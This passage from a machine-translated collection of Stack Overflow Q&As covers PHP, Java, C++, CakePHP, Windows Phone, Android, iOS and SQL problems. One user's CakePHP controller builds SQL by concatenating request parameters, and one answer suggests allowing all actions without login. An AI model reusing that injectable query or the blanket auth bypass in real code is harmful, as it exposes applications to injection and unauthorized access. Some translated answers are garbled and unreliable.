                        'budget_group_id' => $budget_group_id,
                        'month' => $x,
                        'year' => $temp_start_year,
                        'company_id' => $company_id,
                        'month_goal' => $month_goal
                    );

                    // Inserting information into the database
                    $this->db->insert('budget_month',$data);

                }

            }

            $temp_start_year++;

        }

    }

} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-28T07:25:55.433

在你的代码中

```
while($temp_start_year !== $end_year) 
```

您使用了 !== 它还检查了 2 个变量的类型是否相同。

但是这条线

```
$temp_start_year++; 
```

会将变量隐式转换为整数。

因此 !== 将整数与字符串进行比较，这将始终评估为真。

解决方案就像使用 != 而不是 !== 一样简单，或者在调用函数时输入整数而不是字符串（删除单引号）。

# data-binding - 我的 Windows Phone 7 数据绑定有什么问题（未使用视图模型）？

> ID：13599860
> 
> 赞同：0
> 
> 时间：2012-11-28T07:22:08.943
> 
> 标签：data-binding, windows-phone-7.1

我在数据绑定方面遇到了困难。我可以成功获得结果，但它不会显示。这是我的代码：

```
private List<FacebookFriend> friendList;    
public List<FacebookFriend> FriendList
        {
            get { return friendList; }
            set
            {
                friendList = value;
                NotifyPropertyChanged("FriendList");
            }
        }
private void GetFbFriends()
    {
        var fb = new FacebookClient(_accessToken);
        friendList = new List<FacebookFriend>();
        fb.GetCompleted += (o, e) =>
        {
            if (e.Error != null)
            {
                return;
            }
            var result = (JsonObject)e.GetResultData();

            foreach (var friend in (JsonArray)result["data"])
                friendList.Add(new FacebookFriend()
            {
                Id = (string)(((JsonObject)friend)["id"]),
                Name = (string)(((JsonObject)friend)["name"])
            });
            FriendList = friendList;
        };
        fb.GetAsync("me/friends");
    } 
```

然后在页面的 xaml 中：

```
<ListBox ScrollViewer.VerticalScrollBarVisibility="Auto" Grid.Row="2" Grid.ColumnSpan="3" ItemsSource="{Binding FriendList}">
                    <ListBox.ItemTemplate>
                        <DataTemplate>
                                <StackPanel Background="Red" Height="100" Width="300" Orientation="Horizontal">
                                <TextBlock Text="{Binding Path=Name}"/>
                                <TextBlock Text="{Binding Path=Id}"/>
                            </StackPanel>
                        </DataTemplate>
                    </ListBox.ItemTemplate>
                </ListBox> 
```

这似乎是正确的，但仍然没有显示任何内容。任何帮助表示赞赏。非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:57:06.683

尝试使用`ObservableCollection<>`而不是`list<>`. 有关更多信息，请参阅[此](http://www.codeproject.com/Articles/42536/List-vs-ObservableCollection-vs-INotifyPropertyCha)

注意：`ObservableCollection`是一个通用的动态数据集合，当`items get added, removed, or when the whole collection is refreshed`.

# java - 循环中的新对象会删除旧对象吗？

> ID：13599861
> 
> 赞同：1
> 
> 时间：2012-11-28T07:22:10.163
> 
> 标签：java, oop, garbage-collection

抱歉这么简单的问题，但我是 Java 新手（通常用 c 编写）

new in 循环删除对象的旧实例？

我需要类似的东西

```
 for(;;)
   {

     // work on here pixels[] 

     source = new MemoryImageSource(200, 200, pixels, 0, 50);
     image  = createImage(source;

    // then use image here

   } 
```

我只需要到上面，每帧新包装`source`和`image`对象，不想麻烦删除它，而且我不想存储大量它们作为内存泄漏，
它会被自动删除吗？是不是繁重的操作？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T07:30:49.963

是的，不再被引用的对象将被自动垃圾收集（在未来未指定的时间点）。

我建议将`source`and的声明`image`移到循环中：

```
for(;;) {
  ...
  Source source = new MemoryImageSource(200, 200, pixels, 0, 50);
  Image image  = createImage(source);
  ...
} 
```

这不仅在风格上更可取，而且还避免了将最后一次迭代的对象保留的时间超过必要的时间。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T07:28:41.957

不，在循环中创建新实例并将其分配给变量并不会“删除”它所指向的旧实例。但是，只要没有对实例的其他引用，它就有资格被垃圾收集。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T07:39:50.610

GC 是 JAVA 和 C++ 的基本区别。Java 开发者不再需要关心删除实例，一旦实例不再被引用，GC 机制会自动删除它。例如， `for (int i =0;i < 2;i ++){ source = new MemoryImageSource(200, 200, pixels, 0, 50); }` 在循环中，实际上创建了 2 个实例。但是在循环之后只有第二个实例被源引用。所以第一个实例有资格被垃圾收集。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-28T07:59:37.143

循环内的 Java 行为可能相当奇怪。请参阅 Marko Topolnik 对[Java OutOfMemoryError 奇怪行为的解释](https://stackoverflow.com/questions/13531004/java-outofmemoryerror-strange-behaviour)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-28T08:22:51.583

我想说最有效的是：

```
Image image;

for(;;) {

    image  = createImage(new MemoryImageSource(200, 200, pixels, 0, 50));
  ...
} 
```

如果您使用大量引用，则会删除一个不必要的引用，然后重用 Image 图像引用，而不是在每次迭代中为引用分配内存。

# java - 如何将以下字符串日期转换为 Java 中的 Java 数据格式？

> ID：13599865
> 
> 赞同：3
> 
> 时间：2012-11-28T07:22:24.297
> 
> 标签：java, simpledateformat

如何将以下字符串日期转换为 Java 中的数据格式？

```
"10/01/2012  06:45:23:245946" 
```

我正在使用以下代码

```
dateFormat = new SimpleDateFormat("MM/dd/yyyy  hh24:mm:ss:SSS");
java.util.Date parsedDate = dateFormat.parse("10/01/2012  06:45:23:245946"); 
```

我收到以下错误

```
 java.text.ParseException: Unparseable date: "10/01/2012  06:45:23:245946" 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-28T07:26:08.417

[SimpleDateFormat](http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html)中没有`hh24`，您应该使用`HH`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-28T07:26:03.033

你的模式是错误的。尝试：

```
"MM/dd/yyyy  HH:mm:ss:SSS" 
```

没有`hh24`日期匹配模式。

小时的模式如下：

```
H  Hour in day (0-23)  Number  0  
k  Hour in day (1-24)  Number  24 
```

[请参阅SimpleDateFormat](http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html) javadoc上的整个日期模式。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-28T07:26:28.370

您快到了。

去掉 hh 之后的 24 并将其更改为 HH，这应该可以正常工作。

```
SimpleDateFormat dateFormat = new SimpleDateFormat("MM/dd/yyyy  HH:mm:ss:SSS");
Date parsedDate = dateFormat.parse("10/02/2012  06:45:23:245946");
System.out.println(parsedDate); 
```

这会及时给您一个错误，但会成功解析日期，我们所有的答案也是如此。`245946`这是通过将毫秒数从到修剪到 3 位来解决的`245`

但是，如果您确实想使用 6 位数字，我建议您查看 JodaTime API 以获得更高级的日期处理，因为 JodaTime 处理微秒。但至于`java.util.Date`，恐怕你倒霉了。

阅读此错误报告原因： [http ://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4148168](http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4148168)

编辑：感谢 Jesper 指出我的错误措辞

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-28T07:27:39.630

您的`24`日期格式中的 是无效的格式说明符。去掉它。 `HH`相当于 24 小时制的小时数。

```
dateFormat = new SimpleDateFormat("MM/dd/yyyy  HH:mm:ss:SSS"); 
```

# session - 尝试访问控制器时 CakePHP 登录

> ID：13599866
> 
> 赞同：0
> 
> 时间：2012-11-28T07:22:27.480
> 
> 标签：session, cakephp, controller

我遇到了老师要求我修改的网络应用程序的问题，问题在于我对 cakePHP 不了解，我一直遇到麻烦。阅读了很多之后，我想我已经掌握了框架的基础知识。我现在的问题是我在视图中有一个链接，所以我在控制器中调用一个函数来从模型中检索数据，问题是每次我尝试访问该函数时，应用程序让我登录，以及这个想法它不应该。我不确切知道 cakePhp 上的会话处理是如何工作的，我请求一些帮助。控制器的代码是这样的：

```
<?php
class RwController extends AppController {
var $name = 'Rw';
// var $paginate = array(
    // 'Tip' => array(
        // 'limit' => 1,
        // 'order' => array(
            // 'tip.created' => 'desc'
        // ),
    // ),
    // 'Evento' => array(
        // 'limit' => 1,
        // 'order' => array(
            // 'evento.fecha' => 'desc'
        // ),
    // )
// );
function map() {
    $this->helpers[]='GoogleMapV3';
}
function pageForPagination($model) {
    $page = 1;
    // $chars = preg_split('/model:/', $this->params['url']['url'], -1, PREG_SPLIT_OFFSET_CAPTURE);
    // #print_r($chars);
    // if(sizeof($chars) > 1 && sizeof($chars) < 3) {
        // #echo "Belongs to ".$model.": \n";
        // #echo var_dump($chars);
    // }
    // $params = Dispatcher::parseParams(Dispatcher::uri());
    // echo "<p>".var_dump($params)."</p><br />";
    #echo $this->params['named']['model'].$model;
    #echo $this->params['named']['page'];
    $sameModel = isset($this->params['named']['model']) && $this->params['named']['model'] == $model;
    $pageInUrl = isset($this->params['named']['page']);
    if ($sameModel && $pageInUrl) {
        $page = $this->params['named']['page'];
    } else {
        #echo var_dump($this->passedArgs);
    }
    $this->passedArgs['page'] = $page;
    return $page;
}

function index() {
    $this->log('indexeando esta chingadera','debug');
    $this->loadModel('User');
    $this->loadModel('Evento');
    $this->loadModel('Tip');

    $dataEvento = $this->Evento->find('all');
    $dataTip = $this->Tip->find('all');

    $page = $this->pageForPagination('Evento');
    $this->paginate['Evento'] = array(
        'contain' => false,
        'order' => array('Evento.fecha' => 'desc'),
        'limit' => 1,
        'page' => $page
    );
    $dataEvento = $this->paginate('Evento');

    $page = $this->pageForPagination('Tip');
    $this->paginate['Tip'] = array(
        'contain' => false,
        'order' => array('Tip.created' => 'desc'),
        'limit' => 1,
        'page' => $page
    );
    $dataTip = $this->paginate('Tip');

    $this->set('users', $this->User->find('all'));
    $this->set('eventos', $dataEvento);
    $this->set('tips', $dataTip);
    $this->set('rw');

    if(isset($this->params['named']['model'])) {
        if (strcmp($this->params['named']['model'], 'Evento') == 0) {
            if($this->RequestHandler->isAjax()) {
                $this->render('/elements/ajax_rw_evento_paginate');
                return;
            }
        } elseif (strcmp($this->params['named']['model'], 'Tip') == 0) {
            if($this->RequestHandler->isAjax()) {
                $this->render('/elements/ajax_rw_tip_paginate');
                return;
            }
        }
    }
}

function about($id = null) {
    $this->Rw->recursive = 0;
    $this->set('rw', $this->paginate());
}

function beforeFilter() {
        parent::beforeFilter(); 
        $this->Auth->allow(array('index', 'about'));
}

function getCentros($id){
    $this->loadModel('Centro');
    $this->log('getcentros','debug');
    if( sizeof($id) > 1){
        $this->set('centros', $this->Centro->query("SELECT centros.id, name, latitud ,longitud 
                                                        FROM `centros`,`centrosmateriales` 
                                                            WHERE centros.id = centro_id 
                                                                AND material_id ='".$id[0]."' 
                                                                    OR material_id='".$id[1]."'"));
    }elseif( sizeof($id) >0) {
        if($id == 0){
            $this->set('centros', $this->Centro->find('all'));
        }else{
            $this->set('centros', $this->Centro->query("SELECT centros.id, name, latitud ,longitud 
                                                            FROM `centros`,`centrosmateriales` 
                                                                WHERE centros.id = centro_id 
                                                                    AND material_id ='".$id[0]."'"));
            }
        }
        $this->redirect(array('action' => 'index'));
}

}   
?> 
```

编辑：

我调用的函数是getCentros()。

这就是我在 app_controller 中所拥有的。

```
<?php 
class AppController extends Controller {
    var $components = array('Session', 'Auth', 'RequestHandler');
    var $helpers = array('Html', 'Form', 'Time', 'Session', 'Js', 'Paginator', 'GoogleMapV3');
    function beforeFilter() {
        $this->Auth->userModel = 'User';
        $this->Auth->fields = array('username' => 'email', 'password' => 'password');
        $this->Auth->loginAction = array('admin' => false, 'controller' => 'users', 'action' => 'login');
        $this->Auth->loginRedirect = array('controller' => 'users', 'action' => 'index');
    }
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T08:59:51.370

不知道您要调用哪个函数，但如果 cake 尝试让您登录并且您不希望将此函数添加到：

```
$this->Auth->allow(array('index', 'about')); 
```

在你的前过滤器中

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T09:52:39.447

试试这个

```
$this->Auth->allow(array('*')); 
```

它允许您访问控制器内部的所有功能。

但在此之前，请确保您可以访问控制器而不会出现错误，因为您的控制器名称是这样的

```
class RwController extends AppController {

} 
```

可能是这样的

```
class RwsController extends AppController {

} 
```

# c++ - 对如何使用指针和向量指针感到困惑

> ID：13599870
> 
> 赞同：0
> 
> 时间：2012-11-28T07:22:55.653
> 
> 标签：c++

我对如何使用指针和向量指针来执行正确的操作感到困惑。

我想将 vector 的元素传递`Vec`给 struct function `updateHeap`。`updateHeap`修改这些成员的值。我不能用下面的代码完全实现这个结果。我在我的代码中注释了部分以更好地解释我的问题。

```
#include <vector>
#include <iostream>

struct A
{
    A() : hLoc(100){}
    A(int av, int bv):a(av),b(bv),hLoc(100){}

    int a, b;
    int hLoc;
};

struct Heap
{
    Heap() : heapMembers(new std::vector<A>) {}

    Heap(std::vector<A> *members) : heapMembers(members) {}

    void updateHeap(unsigned int idx)
    {
        (*heapMembers)[idx].a*=2;   
    }

    std::vector<A> *heapMembers; //ptr
};

int main()
{
    std::vector<A> aVec;  
    //I want to use updateHeap function in struct Heap to modify values of select elements of aVec

    A a0(2,5), a1(4,2), a2(8,4);  
        aVec.push_back(a0); aVec.push_back(a1); aVec.push_back(a2); 
        //Here I initialized aVec

    Heap minHeap1;
    //In minHeap1, I want to add elements one by one

    minHeap1.heapMembers->push_back(aVec[1]); 
    //I added a selected element (aVec[1]) in aVec to the heap; 
    minHeap1.updateHeap(minHeap.heapMembers->size()-1); 
    //I want to modify the value of aVec[1].a by calling updateHeap function
    std::cout << aVec[1].a << "\n";
    //Output: 4 , I want this value to be 2*4=8\. 

    std::vector<A> heapVec;  
    heapVec.push_back(a1);

    Heap minHeap2(&heapVec);
    //In minHeap2, I want to give it a vector of selected elements
    minHeap2.updateHeap(minHeap2.heapMembers->size()-1);
    //I want to modify the value of aVec[1].a by calling updateHeap function
    std::cout <<    aVec[1].a << "\n";
    //Output: 4 , I want this value to be 2*4=8.
    std::cout << heapVec[0].a << "\n";
    //Output: 8 , This is the right answer, but I want aVec[1].a to take upon this value

    delete minHeap1.heapMembers;

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T08:22:49.893

您的问题是`vector::push_back()`将推送的元素复制到向量中；它不会推送参考或类似的东西。所以之后：

```
minHeap1.heapMembers->push_back(aVec[1]); 
```

`(*minHeap1.heapMembers)[0]`将是`aVec[1]`. 更改它（就像您在 中所做的那样`Heap::updateHeap()`）会更改副本，而不是原始文件。

如果您希望能够`aVec`通过进行更改`minHeap1`，您将需要在堆内实际使用该向量（或多或少地使用`heapVec`and `minHeap2`）或更改内部的向量`Heap`，使其不包含值，而是包含引用或指针。您不能拥有`std::vector`of 引用，因此您将不得不使用指针：

```
struct Heap
{
    Heap() : heapMembers(new std::vector<A*>) {}

    Heap(std::vector<A*> *members) : heapMembers(members) {}

    void updateHeap(unsigned int idx)
    {
        (*heapMembers)[idx]->a*=2;   
    }

    std::vector<A*> *heapMembers; //ptr
}; 
```

然后，在您的`main()`功能中：

```
minHeap1.heapMembers->push_back(&aVec[1]); 
```

当然，这会给内部指针所指向的元素的生命周期带来一些问题，`heapMembers`但`main()`只要你注意制作.`heapVec``std::vector<A*>`

# api - Freebase 建议键

> ID：13599871
> 
> 赞同：1
> 
> 时间：2012-11-28T07:22:56.700
> 
> 标签：api, key, freebase

Freebase 建议看起来很棒，所以我想对其进行测试。我首先只是将他们的简单示例复制并粘贴到一个新页面中并在本地进行了测试。当我开始在输入框中输入内容时，我得到了一个结果列表，但弹出窗格保持为空。这是该页面的代码：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link type="text/css" rel="stylesheet" href="https://www.gstatic.com/freebase/suggest/4_0/suggest.min.css" />
<script type="text/javascript"src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.js"></script>
<script type="text/javascript" src="https://www.gstatic.com/freebase/suggest/4_0/suggest.min.js"></script>
<script type="text/javascript">
  $(function() {
  $("#myinput").suggest({
                 filter:'(all type:/film/film)'});
  });
</script>
</head>
<body>
<input type="text" id="myinput"/>
</body>
</html> 
```

例如，如果我搜索《星球大战》，则没有图像和文本加载到飞出窗格中。我以为是因为我没有 API 密钥，所以我在 google 的 API 控制台上找到了一个，并添加了“http://mysite.com:8888/mysite.com/”作为引用（我正在 MAMP 文件夹中测试它） ）。正如 wiki 页面上所解释的，我已将密钥添加到我的代码中。

```
$("#myinput").suggest({
                       key:'my key',
                       filter:'(all type:/film/film)'});
}); 
```

现在，当在输入框中输入内容时，我只会得到“正在搜索...”。我想我在 google API 控制台上做错了，我不确定我应该输入哪些裁判。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T20:49:11.620

好的，我想通了，我在 Google 的 API 控制台上的推荐人哪里错了。我的本地地址的正确格式很简单：

`mysite.com:8888`

# cryptography - SHA-2 签名的文档可以使用 SHA-1 进行验证吗？

> ID：13599872
> 
> 赞同：0
> 
> 时间：2012-11-28T07:22:59.040
> 
> 标签：cryptography

我正在开发一个可以同时使用 SHA-128 和 SHA-256 签署文档的应用程序。现在的困惑是，如果我使用 SHA-256 签署文件，是否可以使用 SHA-128 进行验证，反之亦然？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:25:08.407

SHA-128 不存在。也许你的意思是 SHA-1？

无论如何，答案是否定的。如果文档使用 SHA-256 签名，则必须使用 SHA-256 进行验证。

更一般地说，当您验证数字签名时，您必须应用与发起者完全相同的加密哈希算法。

# sharepoint - 内容查询 webpart 共享点中未显示多行文本列

> ID：13599874
> 
> 赞同：0
> 
> 时间：2012-11-28T07:23:00.180
> 
> 标签：sharepoint, sharepoint-2007, cqwp

我想在 CQWP 中添加自定义列文档描述，为此我在 ItemStyle.xsl 中添加了下面的代码

> xsl:value-of select="@Doc​​ument_x0020_Description" disable-output-escaping="yes"

在 wepart 我使用了下面的代码

> 属性名称="CommonViewFields" type="string">Document_x0020_Description,注意

但即使在执行此 CQWP 后未显示其值，它也会变为空白，但是当我对“单行文本”类型列执行相同的步骤时，在这种情况下一切正常。

请让我知道如何在 CQWP 中添加多行文本列

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-29T09:10:37.527

还可以尝试在 webpart 中设置属性“DataMappingViewFields”和“DataMappings”，例如：

```
<property name="DataMappings" type="string">LinkUrl:{94f89715-e097-4e8b-ba79-ea02aa8b7adb},FileRef,Lookup;|Description:{691b9a4b-512e-4341-b3f1-68914130d5b2},ShortComment,Text;|ImageUrl:{b9e6f3ae-5632-4b13-b636-9d1a2bd67120},EncodedAbsThumbnailUrl,Computed;{543bc2cf-1f30-488e-8f25-6fe3b689d9ac},PublishingRollupImage,Image;|Title:{fa564e0f-0c70-4ab9-b863-0177e6ddd247},Title,Text;|Ingress:{C0ECDC73-85A2-478B-823D-B882219ACA8A},Ingress,Note;|</property>

<property name="DataMappingViewFields" type="string">{94f89715-e097-4e8b-ba79-ea02aa8b7adb},Lookup;{b9e6f3ae-5632-4b13-b636-9d1a2bd67120},Computed;{543bc2cf-1f30-488e-8f25-6fe3b689d9ac},Image;{fa564e0f-0c70-4ab9-b863-0177e6ddd247},Text;{691b9a4b-512e-4341-b3f1-68914130d5b2},Text;{C0ECDC73-85A2-478B-823D-B882219ACA8A},Note;</property> 
```

此处称为“Ingress”的最后一个属性是 Note-field。也许这将使该字段在 xsl 中可用？

# c# - 从 OpenReadCompletedEventArgs 结果转换为图像对象

> ID：13599878
> 
> 赞同：0
> 
> 时间：2012-11-28T07:23:06.420
> 
> 标签：c#, web-services, windows-phone-7, png, media

我正忙于调用 web 服务的 windows phone 应用程序，该 web 服务又返回 png 图像。在我处理返回结果的代码中，它看起来像这样：

```
void ImgDownloader_OpenReadCompleted(object sender, OpenReadCompletedEventArgs e)
{
    var graphImage = e.Result;
    imgGraph.Source = graphImage; //Error here

    //Stop loading animation
    refreshProgressBar.IsIndeterminate = false;
} 
```

但目前我收到一个错误（见评论），上面写着：

> 无法将 IO.Stream 类型隐式转换为 Media.ImageSource。

普通类型解析会在这里工作还是应该以其他方式处理？提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T08:00:33.393

你应该使用这个[`BitmapImage`](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.bitmapimage%28v=vs.95%29.aspx)类：

```
void ImgDownloader_OpenReadCompleted(object sender, OpenReadCompletedEventArgs e)
{
    var graphImage = e.Result;

    BitmapImage bitmap = new BitmapImage();
    bitmap.SetSource(graphImage);
    imgGraph.Source = bitmap;

    //Stop loading animation
    refreshProgressBar.IsIndeterminate = false;
} 
```

# ios - 在处理 iOS 应用程序中的网络/超时问题时需要帮助

> ID：13599879
> 
> 赞同：0
> 
> 时间：2012-11-28T07:23:11.740
> 
> 标签：ios, web-services, ios6

我们正面临一个奇怪的问题，我们不知道如何处理它。

**问题是 ：**

我们有一个创建报告的应用程序，当用户提交它时，它会在服务器上提交。我们以 json 响应的形式得到确认，以了解操作是否成功。

**但对于 2 种情况，例如：**

1.  用户提交报告。在设备上收到响应之前，网络会断开连接。
2.  用户提交报告，但在 120 秒内未收到响应，因此超时。

（***注意****：我们已经在代码中加入了超时和 WiFi 检查。*）

在这两种情况下，由于请求已到达服务器，因此报告会在服务器上提交。由于客户端没有收到任何响应，因此客户端会显示一条错误消息。现在用户再次尝试提交报告，这是不正确的并导致报告重复。

我们如何处理这种情况？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:38:24.290

用户提交时生成唯一的提交 ID。如果失败，请使用相同的 ID 再次提交。服务器将检查 ID 是否存在并报告该报告已存在。

# android - android应用程序中UnknownHostException的原因是什么？

> ID：13599883
> 
> 赞同：0
> 
> 时间：2012-11-28T07:23:23.927
> 
> 标签：android, exception, browser, unknown-host

我面临一个奇怪的问题。

我正在尝试从三星 Galaxy Nexus 访问服务器。大多数情况下一切正常，但是我观察到有时，在移动设备上运行的应用程序无法连接到服务器，下面是异常跟踪。

发生这种情况时，应用程序无法始终如一地访问服务器。有一次重现这个问题的时候，我尝试在手机浏览器中打开网址，网址打开了。但是，在应用程序中，我们仍然面临问题。我强制停止应用程序并重新启动，仍然是同样的问题。最终，我不得不重置我的 wifi 并发布，一切正常。

请注意，出于保密问题，此处提到的实际 URL 已被隐藏。

请问有什么意见吗？

问候，

> > ----- 日志开始
> 
> 警告: (2160,e,ProtocolObjectHTTP)http EX:ConnectExceptionfailed to
> 
> 连接到 abc-def.csrlbs.com/50.19.101.191（端口 80）：连接失败：ETIMEDOUT（连接超时） java.net.ConnectException：无法连接到 abc-def.csrlbs.com/50.19.101.191（端口80）：连接失败：在 java.net.PlainSocketImpl.connect(PlainSocketImpl.java:192) 在 java.net.PlainSocketImpl.connect 的 libcore.io.IoBridge.connect(IoBridge.java:114) 的 ETIMEDOUT（连接超时） (PlainSocketImpl.java:459) 在 java.net.Socket.connect(Socket.java:842) 在 libcore.net.http.HttpConnection.(HttpConnection.java:76) 在 libcore.net.http.HttpConnection.(HttpConnection. java:50) 在 libcore.net.http.HttpConnectionPool.get(HttpConnectionPool.java:87) 在 libcore.net.http.HttpConnection.connect 的 libcore.net.http.HttpConnection$Address.connect(HttpConnection.java:340) （HttpConnection.java：128) 在 libcore.net.http.HttpEngine.openSocketConnection(HttpEngine.java:316) 在 libcore.net.http.HttpEngine.connect(HttpEngine.java:311) 在 libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java :290) 在 libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:240) 在 libcore.net.http.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:81) 在 libcore.net.http.HttpURLConnectionImpl.getOutputStream(HttpURLConnectionImpl. java:197) 在 com.sirf.pal.android.ProtocolObjectHTTP.a(SourceFile:138) 在 com.sirf.pal.android.ea(SourceFile:265) 在 com.sirf.pal.android.ProtocolObjectHTTP.run(SourceFile :524) at java.lang.Thread.run(Thread.java:856) 原因：libcore.io.ErrnoException：连接失败：libcore.io.Posix.connect(Native Method) 处的 ETIMEDOUT（连接超时）libcore .io。BlockGuardOs.connect(BlockGuardOs.java:85) 在 libcore.io.IoBridge.connectErrno(IoBridge.java:127) 在 libcore.io.IoBridge.connect(IoBridge.java:112) ... 18 更多
> 
> 2012 年 11 月 28 日下午 12:00:50 com.sirf.pal.android.da 警告：(2160,e,ProtocolObjectHTTP)http UnknownHostException wait completed1 Nov 28, 2012 12:00:50 PM com.sirf.pal.android。 da WARNING: (2160,e,ProtocolObjectHTTP)http UnknownHostExceptionUnable to resolve host "abc-def.csrlbs.com": No address associated with hostname
> 
> 2012 年 11 月 28 日下午 12:00:51 com.sirf.pal.android.da 警告：(2160,e,ProtocolObjectHTTP)http UnknownHostException 等待已完成 2012 年 11 月 28 日下午 12:00:51 com.sirf.pal.android。 da WARNING: (2160,e,ProtocolObjectHTTP)http UnknownHostExceptionUnable to resolve host "abc-def.csrlbs.com": No address associated with hostname
> 
> 2012 年 11 月 28 日下午 12:00:52 com.sirf.pal.android.da 警告：(2160,e,ProtocolObjectHTTP)http UnknownHostException wait completed3 Nov 28, 2012 12:00:52 PM com.sirf.pal.android。 da WARNING: (2160,e,ProtocolObjectHTTP)http UnknownHostExceptionUnable to resolve host "abc-def.csrlbs.com": No address associated with hostname
> 
> 2012 年 11 月 28 日下午 12:00:52 com.sirf.pal.android.da 警告：(2160,e,ProtocolObjectHTTP)http UnknownHostExceptionUnable to resolve host "abc-def.csrlbs.com": No address associated with hostname
> 
> 2012 年 11 月 28 日 12:00:54 PM com.sirf.pal.android.da 警告：(2160,e,ProtocolObjectHTTP)http UnknownHostException wait completed1 Nov 28, 2012 12:00:54 PM com.sirf.pal.android。 da WARNING: (2160,e,ProtocolObjectHTTP)http UnknownHostExceptionUnable to resolve host "abc-def.csrlbs.com": No address associated with hostname
> 
> 2012 年 11 月 28 日下午 12:00:55 com.sirf.pal.android.da 警告：(2160,e,ProtocolObjectHTTP)http UnknownHostException 等待已完成 2012 年 11 月 28 日下午 12:00:55 com.sirf.pal.android。 da WARNING: (2160,e,ProtocolObjectHTTP)http UnknownHostExceptionUnable to resolve host "abc-def.csrlbs.com": No address associated with hostname
> 
> 2012 年 11 月 28 日 12:00:56 PM com.sirf.pal.android.da 警告：(2160,e,ProtocolObjectHTTP)http UnknownHostException wait completed3 Nov 28, 2012 12:00:56 PM com.sirf.pal.android。 da WARNING: (2160,e,ProtocolObjectHTTP)http UnknownHostExceptionUnable to resolve host "abc-def.csrlbs.com": No address associated with hostname
> 
> 2012 年 11 月 28 日下午 12:00:56 com.sirf.pal.android.da 警告：(2160,e,ProtocolObjectHTTP)http UnknownHostExceptionUnable to resolve host "abc-def.csrlbs.com": No address associated with hostname
> 
> 2012 年 11 月 28 日 12:00:57 PM com.sirf.pal.android.da 警告：(2160,e,ProtocolObjectHTTP)http UnknownHostException wait completed1 Nov 28, 2012 12:00:57 PM com.sirf.pal.android。 da WARNING: (2160,e,ProtocolObjectHTTP)http UnknownHostExceptionUnable to resolve host "abc-def.csrlbs.com": No address associated with hostname
> 
> > ----- 日志结束

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-07-06T06:48:12.560

(1) 请检查您是否添加了以下android权限

```
<uses-permission android:name="android.permission.INTERNET" />
</manifest> 
```

(2) 如果在您的域中使用下划线，则 android 中存在一个已知问题。验证您的域不使用下划线。在域中使用下划线是无效的，并且会引发未知主机异常。

(3) 检查您的互联网连接是否开启并且可以从您的设备访问域名。

# mysql - 调整数据库结构或 SQL 查询以允许特定的输出

> ID：13599884
> 
> 赞同：0
> 
> 时间：2012-11-28T07:23:28.413
> 
> 标签：mysql, sql, database, database-design

我正在从头开始创建一个非常简单的应用程序，以允许订购东西，然后显示每个客户的成本。

这是我第一次涉足编程领域，所以我正在尽我所能理解很多东西，并尽可能遵循最佳实践。

我遇到了一个暂时困扰我的问题

我有以下表结构

```
**Customers:**

id firstName lastName country days
----------------------------------------

1, john, smith, usa, 5

**Items:**

itemID, itemName, itemCost
------------------------------

1, blueFish, 20

2, dayCost, 10

**Purchases:**

id numBlueFish numPinkFish numRedFish numGreenFish
--------------------------------------------------

1, 0, 0, 2, 4 
```

我希望能够在显示余额的页面上显示以下信息：

```
<b>Total Balance</b>

<p> Day costs: </p>
<p> Blue Fish cost: </p>
<p> Pink Fish cost: </p>
<p> Red Fish cost: </p>
<p> Green Fish cost: </p>
<p> Total: </p>

<b> Balance Owing :</b>

<p> Day costs total: </p>
<p> Blue Fish total: </p>
<p> Pink Fish total: </p>
<p> Red Fish total: </p>
<p> Green Fish total: </p>
<p> Total: </p> 
```

为了显示上述信息，我想我可以：

*   通过将 customers.days 乘以 items.dayCost 来计算当日成本
*   通过将 customers.numColorFish 乘以 items.colorFish 来计算每条鱼的成本
*   通过将每个customers.numColorFish 乘以它对应的items.colorFish 来计算总数，将它们加在一起，然后将其添加到customers.days by items.dayCost 的结果中

到目前为止，我认为我的结构可以很好地完成上述所有工作。

我现在想做的是支付任意金额，并显示剩余的余额以及总成本。

如果可能的话，对于每个成本，可以将鱼的数量放在括号中，例如：

```
<p> Red Fish total: $160 (4) </p> 
```

我需要从根本上改变我的表结构吗？在我的客户表中添加一个 amountPaid 列就足够了吗？

每次付款时我都应该有一张表格来记录吗？这会使输出客户支付/欠款的金额变得更加复杂吗？

这种方法的缺点是什么？有哪些更好的方法，符合更好的实践？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:33:25.140

您的客户是否只进行过一次付款？如果没有，您不想将 amountPaid 添加到您的客户表中。您最想做的是将支付信息存储在一个完全独立的表中。您已经有一个可以存储订单的订单表，但是您没有任何方法可以将客户与订单联系起来。

我不确切知道您要做什么，但我将从以下内容开始：

